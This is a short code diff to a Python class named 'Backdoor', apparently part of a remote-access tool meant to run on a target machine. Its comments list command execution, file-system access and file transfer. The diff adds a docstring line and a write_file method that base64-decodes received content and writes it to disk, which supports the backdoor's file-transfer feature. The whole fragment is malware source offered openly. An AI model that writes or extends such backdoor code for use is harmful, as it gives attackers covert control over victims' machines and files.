@@ -15,6 +15,7 @@ Backdoor:
         2. Access file system
         3. Upload/Download files
             - a file is a series of character
+            - uploading a file is the opposite of downloading a file
             - transfer a file we need to:
                 a) read the file as a sequence of characters
                 b) send this sequence of characters
@@ -93,6 +94,20 @@ class Backdoor:
         """
         os.chdir(path)
         return "[+] Changing working directory to " + path
+
+    def write_file(self, path, content):
+        """
+        Write the target's downloaded file.
+        :param path: path that we want to store the file
+        :type path: str
+        :param content: the content of the file that we want to download
+        :type content: obj
+        :return: message
+        :rtype: str
+        """
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
 
     def read_file(self, path):
         """
